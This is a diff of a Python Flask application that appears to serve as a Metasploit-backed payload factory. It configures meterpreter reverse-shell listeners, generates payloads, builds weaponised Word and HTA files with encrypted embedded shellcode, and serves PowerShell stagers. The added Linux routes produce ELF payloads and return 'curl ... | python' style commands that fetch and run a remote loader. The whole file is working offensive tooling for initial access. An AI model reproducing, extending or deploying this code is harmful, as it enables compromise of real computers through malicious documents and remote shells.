@@ -127,29 +127,24 @@ LISTENER_CONFIGS = {}
 for cfg in CFGS:
     parts = cfg.split('/')
     platform = parts[0]
-    payload = "/".join(parts[1:])  # e.g. meterpreter/reverse_tcp or pingback_reverse_tcp
+    payload = "/".join(parts[1:])
 
-    key = cfg.replace('/', '_')  # Group configs by payload type
+    key = cfg.replace('/', '_')
 
     LISTENER_CONFIGS[key] = {}
     for arch in (32, 64):
-        # Build full payload path based on arch
         full_payload = f"{platform}/x{arch}/{payload}"
         if arch == 32:
             full_payload = f"{platform}/{payload}"
 
-        # Build config
         LISTENER_CONFIGS[key][arch] = BASIC_LISTENER_CONFIG | {
             "Payload": full_payload,
         }
 
-        # Optionally set HttpProxyIE based on payload characteristics
         if "winhttps" in full_payload:
             LISTENER_CONFIGS[key][arch]["HttpProxyIE"] = False
 
-# Print for inspection
 pprint(LISTENER_CONFIGS)
-
 
 
 msf_client = None
@@ -176,14 +171,9 @@ with open('templates/WIN_VBA_OUT.ps1', 'r') as f:
     WIN_VBA_OUT_TEMPLATE = f.read().strip()
 
 
-
-
-
-
 win = Blueprint('win', __name__)
 lin = Blueprint('lin', __name__)
 info = Blueprint('info', __name__)
-
 
 
 def findmarker(content):
@@ -384,7 +374,6 @@ def generate_info_file(template_path: str, url: str) -> Optional[BytesIO]:
     return file_data
 
 
-
 def findmarker(content):
     marker = (b"\x41" * 100)
     offset = content.find(marker)
@@ -430,8 +419,10 @@ def create_hta(encypted_bytes):
 
     return contents
 
+
 try:
-    msf_client = MsfRpcClient(PASSWORD_MsfRpcClient, username='python', port=55555)
+    msf_client = MsfRpcClient(PASSWORD_MsfRpcClient,
+                              username='python', port=55555)
 except Exception as e:
     logger.error("COULD NOT CONNECT TO MsfRpcClient")
     logger.error("WILL CONTINUE WITHOUT LISTENER AUTOMATION!!!!")
@@ -469,6 +460,7 @@ def generate_payload(
     format: str,
     additional_props: Optional[List[Dict[str, str]]] = None
 ) -> str:
+    # returns a path.
     params = generate_payload_props(
         payload_name, lhost, lport, format, additional_props)
     file_hash = generate_payload_hash(params)
@@ -798,8 +790,6 @@ def tcp(id, stage):
         return render_template_string(WIN_DELEGATE_TEMPLATE, bytes=ps_string)
 
 
-
-
 def get_ip(adapter: str) -> str:
     if adapter not in SAFE_ADAPTERS:
         adapter = "tun0"
@@ -816,7 +806,7 @@ def word_form():
     import os
     template = render_template('1_win_form.html')
     ladapter = request.args.get('ladapter', '')
-    lport = request.args.get('lport', 80)
+    lport = request.args.get('lport', 443)
     uid = request.args.get('uid', os.popen("uuidgen | sed 's/-//g'").read())
     print(f"{ladapter=}")
     print(f"{lport=}")
@@ -837,6 +827,7 @@ def gen_multiple_payloads(lhost, lport, proxy, id, config="windows_meterpreter_r
         endpoint_msfvenom = f"/{endpoint}/{id}_{str(arch)}/"
         print(f"{config=}")
         print(f"{endpoint_msfvenom=}")
+        print(f"{LISTENER_CONFIGS[config][arch]=}")
         setup_listener(
             lhost,
             lport,
@@ -879,8 +870,6 @@ def msgbox_generator(archs=[32, 64]):
             ]
         )
     return retval
-
-
 
 
 def openssl_pbkdf2_encrypt(plaintext: bytes, password: str) -> bytes:
@@ -1044,7 +1033,6 @@ def generate_word_file_aes(template_path: str, encrypted_payloads: List[bytes], 
     return BytesIO(patched_data)
 
 
-
 @win.route('/word_form/get', methods=['POST'])
 def word_get():
     payload_type = request.form['type']
@@ -1068,7 +1056,7 @@ def word_get():
         payloads = gen_multiple_payloads(
             lhost, lport, proxy, id, config="windows_meterpreter_reverse_winhttps", endpoint="ms", archs=[32]
         )
-        
+
         payload_path_32 = f"{PAYLOAD_DIR}/{payloads[32]}"
         with open(payload_path_32, "rb") as f:
             payload_bytes_32 = f.read()
@@ -1138,13 +1126,12 @@ def hta_get():
     )
 
 
-
 @lin.route('/')
 def lin_form():
     import os
     template = render_template('1_lin_form.html')
     ladapter = request.args.get('ladapter', '')
-    lport = request.args.get('lport', 80)
+    lport = request.args.get('lport', 443)
     uid = request.args.get('uid', os.popen("uuidgen | sed 's/-//g'").read())
     print(f"{ladapter=}")
     print(f"{lport=}")
@@ -1158,58 +1145,17 @@ def lin_form():
     return template
 
 
-
-# @lin.route('/elf/<id>/msf.elf')
-# def elf(id):
-#     clean_id = filter_string(id)
-
-#     if clean_id == "":
-#         return "Invalid id", 400
-
-#     lhost, lport = get_host()
-
-#     setup_listener(
-#         lhost,
-#         lport,
-#         LISTENER_CONFIGS["ELF"] | {
-#             "LURI": f"/ms/{clean_id}/"
-#         }
-#     )
-
-#     elf_payload_file = generate_payload(
-#         LISTENER_CONFIGS["ELF"]["Payload"],
-#         lhost,
-#         lport,
-#         'elf',
-#         [
-#             {
-#                 "LURI": f"/ms/{clean_id}/",
-#                 "PrependFork": "true"
-#             }
-#         ]
-#     )
-
-#     return send_from_directory(directory=PAYLOAD_DIR, path=elf_payload_file, as_attachment=True, download_name='msf.elf')
-
-@lin.route('elf/get', methods=['POST'])
-def generate_elf():
-    lhost = request.form.get("lhost", "").strip()
-    lport = request.form.get("lport", "").strip()
-    clean_id = filter_string(request.form.get("id", "").strip())
-
-    if not lhost or not lport or not clean_id:
-        return "Missing parameters", 400
-
+def gen_multiple_payloads_linux(lhost, lport, clean_id, config="windows_meterpreter_reverse_winhttps", endpoint="ms", arch=64):
     setup_listener(
         lhost,
         lport,
-        LISTENER_CONFIGS["ELF"] | {
+        LISTENER_CONFIGS[config][arch] | {
             "LURI": f"/ms/{clean_id}/"
         }
     )
 
-    elf_payload_file = generate_payload(
-        LISTENER_CONFIGS["ELF"]["Payload"],
+    return generate_payload(
+        LISTENER_CONFIGS[config][arch]["Payload"],
         lhost,
         lport,
         'elf',
@@ -1221,14 +1167,67 @@ def generate_elf():
         ]
     )
 
+
+def generate_elf_internal(lhost, lport, clean_id):
+    payloads_generated = gen_multiple_payloads_linux(
+        lhost, lport, clean_id, config="linux_meterpreter_reverse_https", endpoint="ms", arch=64
+    )
+    return payloads_generated
+
+
+@lin.route('elf/get', methods=['POST'])
+def generate_elf():
+    lhost = request.form.get("lhost", "").strip()
+    lport = request.form.get("lport", "").strip()
+    clean_id = filter_string(request.form.get("id", "").strip())
+
+    if not lhost or not lport or not clean_id:
+        return "Missing parameters", 400
     return send_from_directory(
         directory=PAYLOAD_DIR,
-        path=elf_payload_file,
+        path=generate_elf_internal(lhost, lport, clean_id),
         as_attachment=True,
-        download_name='msf.elf'
+        download_name=f'{clean_id}.elf'
     )
 
 
+@lin.route('elf_fee/get', methods=['POST'])
+def generate_elf_fee():
+    lhost = request.form.get("lhost", "").strip()
+    lport = request.form.get("lport", "").strip()
+    clean_id = filter_string(request.form.get("id", "").strip())
+    scripting_language = request.form.get("scripting_language", "").strip()
+    if not lhost or not lport or not clean_id:
+        return "Missing parameters", 400
+
+    print(f"{scripting_language=}")
+    if scripting_language not in ['pl', 'py', 'rb']:
+        return f"{scripting_language not in ['pl', 'py', 'rb'] =}", 400
+
+    bin_loc = generate_elf_internal(lhost, lport, clean_id)
+    command = f"fee {PAYLOAD_DIR}/{bin_loc} -l {scripting_language} | tee {PAYLOAD_DIR}/{bin_loc}.{scripting_language}.bin"
+    with os.popen(command) as f:
+        fee_output = f.read()
+    url = "curl http://{{ lhost }}:{{ lport }}/"
+    if scripting_language == "pl":
+        pipe_to = "perl"
+    if scripting_language == "rb":
+        pipe_to = "ruby"
+    if scripting_language == "py":
+        return render_template_string(
+            url +
+            f"{bin_loc}.{scripting_language}.bin | python</br>" + url +
+            f"{bin_loc}.{scripting_language}.bin | python3",
+            lhost=lhost,
+            lport=lport,
+        ).strip()
+
+    return render_template_string(
+        url +
+        f"{bin_loc}.{scripting_language}.bin | {pipe_to}",
+        lhost=lhost,
+        lport=lport,
+    ).strip()
 
 
 @info.route('/get', methods=['GET', 'POST'])
